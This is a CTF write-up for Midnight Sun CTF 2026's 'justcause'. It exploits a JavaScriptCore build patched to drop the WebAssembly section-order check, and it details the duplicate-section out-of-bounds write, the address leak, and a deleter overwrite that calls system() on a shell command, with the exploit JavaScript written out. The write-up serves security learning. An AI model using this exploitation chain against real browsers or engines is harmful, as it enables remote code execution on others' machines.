---
ctf_name: "Midnight Sun CTF 2026"
challenge_name: "justcause"
category: "pwn"
difficulty: "hard"
author: "oscarjhk"
date: "2026-05-11"
tags: ["JavaScriptCore", "WebAssembly", "OOB write", "CTF"]
---

# justcause

## Problem Description

The challenge provided a patched JavaScriptCore build and a remote service:

```text
nc justcause.play.ctf.se 6666
```

The wrapper accepted JavaScript from stdin and executed it inside the patched
engine. The interesting patch was in WebKit's WebAssembly streaming parser:

```diff
-    WASM_PARSER_FAIL_IF(!validateOrder(m_previousKnownSection, section), "invalid section order, ", m_previousKnownSection, " followed by ", section);
```

This removed the usual known-section ordering check from
`WasmStreamingParser::parseSectionID()`.

## Solution

### Analysis

The patch is reachable through normal JavaScript WebAssembly APIs. Even without
browser-only APIs such as `WebAssembly.compileStreaming()`, this JavaScriptCore
build still routes `new WebAssembly.Module(bytes)` and related validation paths
through `EntryPlan` and the streaming parser.

WebAssembly normally allows each known section only once, in a fixed order. Many
section parsers inside JavaScriptCore rely on that invariant. They reserve vector
capacity using only the count from the current section, then append entries with
`uncheckedAppend()`.

For example, the data section parser effectively does:

```cpp
m_info->data.tryReserveCapacity(segmentCount);
...
m_info->data.uncheckedAppend(WTFMove(segment));
```

This is safe when the `Data` section appears once. After the ordering check was
removed, a second `Data` section reuses the same vector. If the vector already
has `segmentCount` entries and only `segmentCount` capacity, the second section
appends past the backing allocation.

The same bug pattern exists in multiple parsers, including:

- `parseExport()`
- `parseFunction()`
- `parseImport()`
- `parseGlobal()`
- `parseData()`

Duplicate `Export` and `Function` sections were enough to crash the process, but
the useful exploit primitives came from duplicate `Data` and `Global` sections.

### Leak Primitive

The first module used this section layout:

```text
Data(count = 4)
Custom("leak", payload size = 64)
Data(count = 4)
DataCount(count = 8)
```

The first `Data` section allocates the `m_info->data` vector for four entries.
Each entry is a `Segment::Ptr`, which is a `unique_ptr` with a function-pointer
deleter, so on aarch64 it occupies 16 bytes:

```text
[ Segment::destroy ][ Segment* ]
```

The second `Data` section appends four more entries out of bounds. With the
chosen allocation sizes, those four entries land inside the custom section
payload. JavaScript can read that payload with:

```js
WebAssembly.Module.customSections(module, "leak")
```

That leaks:

```text
offset 0x00: JSC::Wasm::Segment::destroy
offset 0x08: Segment* for the first segment from the second Data section
```

The first segment from the second `Data` section stores the shell command, so the
command string address is:

```js
cmdPtr = leakedSegment + 0x14n; // sizeof(Segment)
```

The leaked `Segment::destroy` pointer gives the JavaScriptCore base:

```js
jscBase = destroy - 0x13a1824n;
```

On the remote target, libc was loaded at a fixed offset relative to
libJavaScriptCore:

```js
libcBase = jscBase - 0x3e0000n;
system   = libcBase + 0x470a4n;
```

### Code Execution

The second module used duplicate `Global` sections to corrupt the data vector:

```text
Global(count = 8, i64 globals)
Data(count = 24, dummy passive segments)
Global(count = 8, v128 globals)
Invalid section byte
```

`GlobalInformation` is 48 bytes. Eight globals allocate a 384-byte vector. The
data vector with 24 `Segment::Ptr` entries is also 384 bytes.

The second `Global` section sees enough capacity for eight globals and appends
eight more entries after the end of the global vector. By using `v128.const`, the
first 16 bytes of each overflowing `GlobalInformation` entry are controlled.

That lets the first data entry be overwritten as:

```text
[ system ][ cmdPtr ]
```

After the overwrite, the module intentionally hits an invalid section byte. The
partially built module is cleaned up, and destruction of the corrupted data
vector calls the overwritten deleter:

```c
system(cmdPtr);
```

The process may crash after the command executes because the following corrupted
entries are also destructed, but the command already ran.

### Exploit

The final exploit sends JavaScript that:

1. Builds the leak module.
2. Reads the corrupted custom section to leak `Segment::destroy` and `cmdPtr`.
3. Computes the JavaScriptCore base, libc base, and `system`.
4. Builds the trigger module that overwrites a data segment deleter with
   `system`.
5. Executes:

```sh
cat /flag* flag* 2>/dev/null
```

The relevant JavaScript-side flow was:

```js
let leakMod = new WebAssembly.Module(buildLeakModule());
let leak = new Uint8Array(WebAssembly.Module.customSections(leakMod, "leak")[0]);

let destroy = u64(leak, 0);
let seg = u64(leak, 8);
let cmdPtr = seg + 0x14n;

let jscBase = destroy - 0x13a1824n;
let libcBase = jscBase - 0x3e0000n;
let system = libcBase + 0x470a4n;

try {
    new WebAssembly.Module(buildTriggerModule(system, cmdPtr));
} catch (e) {
}
```

## Flag

```text
midnight{REDACTED}
```

## Takeaways

The removed section-order validation looked small, but several later parsers
implicitly depended on that invariant. Once duplicate known sections were
accepted, `tryReserveCapacity(count)` followed by `uncheckedAppend()` became an
out-of-bounds write pattern across multiple WebAssembly metadata vectors.
